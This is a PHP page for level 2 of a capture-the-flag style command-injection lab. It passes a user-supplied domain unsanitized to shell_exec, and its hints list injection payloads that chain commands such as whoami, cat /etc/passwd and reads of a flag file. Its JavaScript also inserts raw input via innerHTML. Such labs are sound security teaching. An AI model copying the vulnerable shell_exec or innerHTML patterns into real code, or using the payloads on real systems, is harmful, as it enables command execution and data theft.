<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 2 - Command Chaining</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⛓️ Level 2 - Command Chaining</h1>
            <p><strong>Objective:</strong> Sử dụng các toán tử command chaining để thực hiện nhiều lệnh liên tiếp</p>
        </div>

        <div class="form-container">
            <h3>🔍 DNS Lookup Tool:</h3>
            <p>Công cụ này thực hiện DNS lookup để tìm địa chỉ IP của một domain.</p>
            
            <div class="code-block">Command: nslookup <?php echo htmlspecialchars($_GET['domain'] ?? '[DOMAIN]'); ?></div>
            
            <?php
            if (isset($_GET['domain'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $domain = $_GET['domain'];
                
                // Vulnerable code with basic input validation attempt
                if (strlen($domain) > 100) {
                    echo '<div class="error">❌ Domain name too long!</div>';
                } else {
                    $command = "nslookup " . $domain;
                    $output = shell_exec($command);
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo 'No output or command failed';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="domain">Domain Name:</label>
                    <input type="text" id="domain" name="domain" value="<?php echo htmlspecialchars($_GET['domain'] ?? ''); ?>" placeholder="Enter domain (e.g., google.com)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Execute Lookup</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>📚 Command Chaining Operators</h3>
                <ul>
                    <li><strong>;</strong> - Sequential execution (cmd1; cmd2)</li>
                    <li><strong>&&</strong> - Conditional execution - AND (cmd1 && cmd2)</li>
                    <li><strong>||</strong> - Conditional execution - OR (cmd1 || cmd2)</li>
                    <li><strong>|</strong> - Pipe output (cmd1 | cmd2)</li>
                    <li><strong>&</strong> - Background execution (cmd1 & cmd2)</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Testing Normal Function</h4>
                    <p><strong>Current Command:</strong> <code>nslookup [YOUR_INPUT]</code></p>
                    <p>📝 <strong>First Step:</strong> Try a normal domain like <code>google.com</code></p>
                    <p>🎯 <strong>Observe:</strong> See how nslookup works normally</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Sequential Execution (;)</h4>
                    <p><strong>Concept:</strong> Semicolon executes commands one after another</p>
                    <p>📝 <strong>Test:</strong> <code>google.com; whoami</code></p>
                    <p>🎯 <strong>Result:</strong> First nslookup runs, then whoami executes</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>google.com; pwd</code></p>
                    <p>• <code>google.com; ls -la</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Conditional AND (&&)</h4>
                    <p><strong>Concept:</strong> Second command runs only if first succeeds</p>
                    <p>📝 <strong>Test:</strong> <code>google.com && id</code></p>
                    <p>🎯 <strong>Behavior:</strong> If nslookup succeeds, id command runs</p>
                    <p><strong>Compare with:</strong></p>
                    <p>• <code>invalid.domain && id</code> (second command won't run)</p>
                    <p>• <code>google.com && cat /etc/passwd</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Conditional OR (||)</h4>
                    <p><strong>Concept:</strong> Second command runs only if first fails</p>
                    <p>📝 <strong>Test:</strong> <code>invalid.domain || whoami</code></p>
                    <p>🎯 <strong>Result:</strong> Since nslookup fails, whoami executes</p>
                    <p><strong>Useful for:</strong></p>
                    <p>• <code>nonexistent || ls /var/www</code></p>
                    <p>• <code>fake.domain || cat /etc/flag.txt</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Pipe Operations (|)</h4>
                    <p><strong>Concept:</strong> Output of first command becomes input of second</p>
                    <p>📝 <strong>Test:</strong> <code>google.com | grep -i address</code></p>
                    <p>🎯 <strong>Advanced:</strong> Chain multiple operations</p>
                    <p><strong>Creative examples:</strong></p>
                    <p>• <code>echo "test" | cat /etc/flag.txt</code></p>
                    <p>• <code>ls | head -n 1; cat /var/www/secret_flag.txt</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 6: Find the Flag!</h4>
                    <p><strong>🚀 Multiple ways to get the flag:</strong></p>
                    <p><strong>Method 1 (Sequential):</strong> <code>google.com; cat /var/www/secret_flag.txt</code></p>
                    <p><strong>Method 2 (Conditional):</strong> <code>google.com && cat /var/www/secret_flag.txt</code></p>
                    <p><strong>Method 3 (OR logic):</strong> <code>invalid || cat /var/www/secret_flag.txt</code></p>
                    <p><strong>Method 4 (Complex):</strong> <code>google.com; find /var/www -name "*flag*" | head -1 | xargs cat</code></p>
                    <p><strong>💡 Pro tip:</strong> Try different operators to understand their behavior!</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level1.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level3.php">➡️ Next Level</a>
            <a href="submit.php?level=2">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 6;

    function updateCommand() {
        const input = document.getElementById('domain').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: nslookup ' + (input || '[DOMAIN]');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
